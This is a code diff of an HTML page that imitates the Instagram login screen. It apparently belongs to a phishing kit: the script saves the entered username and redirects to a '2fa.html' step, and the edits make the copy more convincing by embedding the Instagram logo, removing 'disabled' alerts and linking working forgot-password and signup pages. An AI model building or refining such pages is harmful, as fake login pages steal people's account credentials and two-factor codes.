@@ -6,11 +6,8 @@
     <title>Instagram</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
-        
-        /* الخلفية السودة (دارك مود) */
         body { background-color: #121212; color: #ffffff; display: flex; flex-direction: column; min-height: 100vh; }
         
-        /* الهيدر */
         .header { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; position: relative; }
         .back-btn { width: 40px; height: 40px; background: rgba(255,255,255,0.05); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; }
         .back-btn svg { width: 20px; height: 20px; fill: #fff; }
@@ -18,13 +15,11 @@
         .lang-selector { color: #e0e0e0; font-size: 15px; display: flex; align-items: center; gap: 4px; cursor: pointer; font-weight: 500; position: absolute; left: 50%; transform: translateX(-50%);}
         .lang-selector svg { width: 14px; fill: #e0e0e0; }
         
-        /* الكونتينر الأساسي */
         .login-container { width: 100%; max-width: 400px; padding: 0 25px; display: flex; flex-direction: column; align-items: center; margin: 30px auto 0 auto; flex: 1;}
         
-        /* اللوجو الملوّن (SVG حقيقي) */
-        .logo { width: 75px; height: 75px; margin-bottom: 60px; }
+        /* لوجو إنستقرام الحقيقي */
+        .logo { width: 75px; height: 75px; margin-bottom: 60px; background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 132 132"><defs><linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="%23f9ce34"/><stop offset="50%" stop-color="%23ee2a7b"/><stop offset="100%" stop-color="%236228d7"/></linearGradient></defs><rect x="6" y="6" width="120" height="120" rx="28" fill="none" stroke="url(%23grad)" stroke-width="12"/><circle cx="66" cy="66" r="30" fill="none" stroke="url(%23grad)" stroke-width="12"/><circle cx="99" cy="33" r="8" fill="url(%23grad)"/></svg>'); background-size: cover; background-position: center; }
         
-        /* الفورم */
         form { width: 100%; display: flex; flex-direction: column; gap: 10px; }
         
         .input-group { position: relative; width: 100%; }
@@ -39,26 +34,14 @@
         
         .forgot-password { color: #ffffff; font-size: 15px; text-decoration: none; margin-top: 25px; text-align: center; display: block; font-weight: 500; cursor: pointer;}
         
-        /* الفراغ اللي في النص */
         .spacer { flex-grow: 1; }
         
-        /* الأزرار اللي تحت */
         .bottom-actions { width: 100%; max-width: 400px; padding: 0 25px; margin-bottom: 30px; display: flex; flex-direction: column; gap: 20px;}
         
         .create-account-btn { width: 100%; background-color: transparent; border: 1px solid #0095f6; color: #0095f6; border-radius: 12px; padding: 14px 16px; font-weight: 600; font-size: 16px; cursor: pointer; transition: 0.2s; }
         
         .meta-footer { display: flex; justify-content: center; align-items: center; gap: 6px; color: #a8a8a8; font-size: 17px; font-weight: 500; cursor: pointer;}
         .meta-footer svg { width: 22px; height: 22px; fill: #a8a8a8; }
-
-        /* نافذة اللغات */
-        .lang-modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 1000; }
-        .lang-modal { display: flex; flex-direction: column; position: fixed; bottom: -100%; left: 0; width: 100%; background: #1a1a1a; border-radius: 20px 20px 0 0; padding: 20px; z-index: 1001; height: 70vh; transition: bottom 0.3s ease-in-out; }
-        .lang-modal.open { bottom: 0; }
-        .lang-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; padding-bottom: 15px; border-bottom: 1px solid #333; }
-        .lang-header button { background: none; border: none; color: #fff; font-size: 24px; cursor: pointer; }
-        .lang-list { list-style: none; display: flex; flex-direction: column; gap: 0; overflow-y: auto; padding-bottom: 20px;}
-        .lang-item { display: flex; justify-content: space-between; align-items: center; font-size: 16px; color: #fff; padding: 15px 0; border-bottom: 1px solid #262626;}
-        .lang-item input[type="checkbox"] { width: 22px; height: 22px; accent-color: #0095f6; }
     </style>
 </head>
 <body>
@@ -67,26 +50,14 @@
         <div class="back-btn">
             <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
         </div>
-        <div class="lang-selector" onclick="toggleLangModal(true)">
+        <div class="lang-selector">
             <span>English (US)</span>
             <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
         </div>
     </div>
 
     <div class="login-container">
-        <!-- اللوجو الحقيقي (SVG) -->
-        <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 132 132">
-            <defs>
-                <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="100%">
-                    <stop offset="0%" stop-color="#f9ce34"/>
-                    <stop offset="50%" stop-color="#ee2a7b"/>
-                    <stop offset="100%" stop-color="#6228d7"/>
-                </linearGradient>
-            </defs>
-            <rect x="6" y="6" width="120" height="120" rx="28" fill="none" stroke="url(#gradient)" stroke-width="12"/>
-            <circle cx="66" cy="66" r="30" fill="none" stroke="url(#gradient)" stroke-width="12"/>
-            <circle cx="99" cy="33" r="8" fill="url(#gradient)"/>
-        </svg>
+        <div class="logo"></div>
         
         <form id="loginForm">
             <div class="input-group">
@@ -99,54 +70,19 @@
             <button type="submit" class="login-btn" id="loginBtn" disabled>Log in</button>
         </form>
         
-        <a href="#" class="forgot-password" onclick="alert('Password reset is currently disabled for this session.'); return false;">Forgot password?</a>
+        <!-- هنا التعديل: الرابط شغال -->
+        <a href="forgot.html" class="forgot-password">Forgot password?</a>
     </div>
 
     <div class="spacer"></div>
 
     <div class="bottom-actions">
-        <button class="create-account-btn" onclick="alert('Account creation is currently disabled.');">Create new account</button>
-        <div class="meta-footer" onclick="window.location.href='https://about.meta.com/'">
+        <!-- هنا التعديل: الزر شغال -->
+        <button class="create-account-btn" onclick="window.location.href='signup.html'">Create new account</button>
+        <div class="meta-footer">
             <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
             Meta
         </div>
-    </div>
-
-    <!-- نافذة اللغات -->
-    <div class="lang-modal-overlay" id="langOverlay" onclick="toggleLangModal(false)"></div>
-    <div class="lang-modal" id="langModal">
-        <div class="lang-header">
-            <button onclick="toggleLangModal(false)">✕</button>
-        </div>
-        <ul class="lang-list">
-            <li class="lang-item"><span>English (US)</span> <input type="checkbox" checked></li>
-            <li class="lang-item"><span>Afrikaans</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>Bahasa Indonesia</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>Bahasa Melayu</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>Dansk</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>Deutsch</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>English (UK)</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>Español</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>Español (España)</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>Filipino</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>Français</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>Italiano</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>Nederlands</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>Polski</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>Português (Brasil)</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>Português (Portugal)</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>Suomi</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>Svenska</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>Tiếng Việt</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>Türkçe</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>Русский</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>العربية</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>ภาษาไทย</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>中文(简体)</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>中文(台灣)</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>日本語</span> <input type="checkbox"></li>
-            <li class="lang-item"><span>한국어</span> <input type="checkbox"></li>
-        </ul>
     </div>
 
     <script>
@@ -193,18 +129,6 @@
             sessionStorage.setItem('insta_user', username);
             window.location.href = '2fa.html';
         });
-
-        function toggleLangModal(show) {
-            const modal = document.getElementById('langModal');
-            const overlay = document.getElementById('langOverlay');
-            if (show) {
-                modal.classList.add('open');
-                overlay.style.display = 'block';
-            } else {
-                modal.classList.remove('open');
-                overlay.style.display = 'none';
-            }
-        }
     </script>
 </body>
 </html>
